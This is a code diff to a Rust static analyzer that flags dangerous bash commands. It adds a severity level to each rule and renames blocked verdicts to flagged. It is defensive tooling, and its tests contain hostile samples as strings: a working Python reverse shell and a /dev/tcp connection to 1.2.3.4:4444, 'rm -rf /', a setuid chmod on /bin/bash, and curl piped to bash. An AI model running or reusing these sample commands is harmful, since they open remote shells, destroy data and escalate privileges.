@@ -14,12 +14,19 @@ static DANGEROUS_COMMAND_QUERY: Lazy<Query> =
 pub struct BlockReason {
     pub rule: &'static str,
     pub detail: String,
+    pub severity: Severity,
 }
 
 #[derive(Debug, PartialEq, Eq)]
 pub enum Verdict {
     Pass,
-    Blocked(BlockReason),
+    Flagged(BlockReason),
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Severity {
+    Block,
+    Caution,
 }
 
 pub fn analyze(script: &str) -> Result<Verdict, BashtionError> {
@@ -42,7 +49,7 @@ pub fn analyze(script: &str) -> Result<Verdict, BashtionError> {
 
     for rule in rules {
         if let Some(reason) = rule(script, tree.root_node())? {
-            return Ok(Verdict::Blocked(reason));
+            return Ok(Verdict::Flagged(reason));
         }
     }
 
@@ -87,6 +94,7 @@ fn rule_dangerous_commands(script: &str, root: Node) -> Result<Option<BlockReaso
             return Ok(Some(BlockReason {
                 rule: "eval",
                 detail: "Dynamic execution via eval".to_string(),
+                severity: Severity::Block,
             }));
         }
 
@@ -94,6 +102,7 @@ fn rule_dangerous_commands(script: &str, root: Node) -> Result<Option<BlockReaso
             return Ok(Some(BlockReason {
                 rule: "base64_decode",
                 detail: "Obfuscation via base64 decode".to_string(),
+                severity: Severity::Block,
             }));
         }
 
@@ -103,6 +112,7 @@ fn rule_dangerous_commands(script: &str, root: Node) -> Result<Option<BlockReaso
                 return Ok(Some(BlockReason {
                     rule: "openssl_decode",
                     detail: "Obfuscation via openssl enc -d".to_string(),
+                    severity: Severity::Block,
                 }));
             }
         }
@@ -111,6 +121,7 @@ fn rule_dangerous_commands(script: &str, root: Node) -> Result<Option<BlockReaso
             return Ok(Some(BlockReason {
                 rule: "netcat_like",
                 detail: format!("Network backdoor tool detected: {}", name),
+                severity: Severity::Block,
             }));
         }
 
@@ -121,6 +132,7 @@ fn rule_dangerous_commands(script: &str, root: Node) -> Result<Option<BlockReaso
                 return Ok(Some(BlockReason {
                     rule: "rm_root",
                     detail: "Destructive command 'rm -rf /'".to_string(),
+                    severity: Severity::Block,
                 }));
             }
         }
@@ -141,6 +153,7 @@ fn rule_dev_tcp(script: &str, root: Node) -> Result<Option<BlockReason>, Bashtio
             return Ok(Some(BlockReason {
                 rule: "dev_tcp",
                 detail: "Network backdoor via /dev/tcp detected".to_string(),
+                severity: Severity::Block,
             }));
         }
 
@@ -168,6 +181,7 @@ fn rule_pipeline_curl_shell(
             return Ok(Some(BlockReason {
                 rule: "curl_pipeline",
                 detail: "curl|wget piped to bash/sh".to_string(),
+                severity: Severity::Caution,
             }));
         }
 
@@ -255,6 +269,7 @@ fn command_python_reverse_shell(command: Node, script: &str) -> Option<BlockReas
         return Some(BlockReason {
             rule: "python_reverse_shell",
             detail: "Python reverse shell detected".to_string(),
+            severity: Severity::Block,
         });
     }
     None
@@ -270,6 +285,7 @@ fn command_sudo_chmod(command: Node, script: &str) -> Option<BlockReason> {
         return Some(BlockReason {
             rule: "sudo_chmod_setuid",
             detail: "Priv-escalation via sudo chmod on shell".to_string(),
+            severity: Severity::Block,
         });
     }
     None
@@ -359,13 +375,13 @@ mod tests {
     #[test]
     fn static_blocks_eval() {
         let verdict = analyze("eval ls").unwrap();
-        assert!(matches!(verdict, Verdict::Blocked(_)));
+        assert!(matches!(verdict, Verdict::Flagged(_)));
     }
 
     #[test]
     fn static_blocks_base64_decode() {
         let verdict = analyze("base64 -d something").unwrap();
-        assert!(matches!(verdict, Verdict::Blocked(_)));
+        assert!(matches!(verdict, Verdict::Flagged(_)));
     }
 
     #[test]
@@ -377,13 +393,13 @@ mod tests {
     #[test]
     fn static_blocks_rm_root() {
         let verdict = analyze("rm -rf /").unwrap();
-        assert!(matches!(verdict, Verdict::Blocked(_)));
+        assert!(matches!(verdict, Verdict::Flagged(_)));
     }
 
     #[test]
     fn static_blocks_dev_tcp() {
         let verdict = analyze("cat </dev/tcp/1.2.3.4/4444").unwrap();
-        assert!(matches!(verdict, Verdict::Blocked(_)));
+        assert!(matches!(verdict, Verdict::Flagged(_)));
     }
 
     #[test]
@@ -400,7 +416,7 @@ mod tests {
         let script = "curl https://example.com/install.sh | bash";
         let verdict = analyze(script).unwrap();
         assert!(
-            matches!(verdict, Verdict::Blocked(_)),
+            matches!(verdict, Verdict::Flagged(_)),
             "curl|bash should be blocked"
         );
     }
@@ -410,7 +426,7 @@ mod tests {
         let script = "python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('1.2.3.4',4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['bash','-i'])\"";
         let verdict = analyze(script).unwrap();
         assert!(
-            matches!(verdict, Verdict::Blocked(_)),
+            matches!(verdict, Verdict::Flagged(_)),
             "python reverse shell should be blocked"
         );
     }
@@ -420,7 +436,7 @@ mod tests {
         let script = "sudo chmod 4777 /bin/bash";
         let verdict = analyze(script).unwrap();
         assert!(
-            matches!(verdict, Verdict::Blocked(_)),
+            matches!(verdict, Verdict::Flagged(_)),
             "sudo chmod on shell should be blocked"
         );
     }
